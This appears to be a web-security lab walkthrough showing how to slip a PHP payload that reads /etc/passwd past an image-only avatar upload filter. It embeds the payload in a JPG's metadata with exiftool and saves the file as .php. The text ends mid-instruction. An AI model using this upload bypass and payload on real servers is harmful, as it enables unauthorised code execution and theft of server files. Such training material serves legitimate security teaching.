1. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example:
```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

3. This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example:
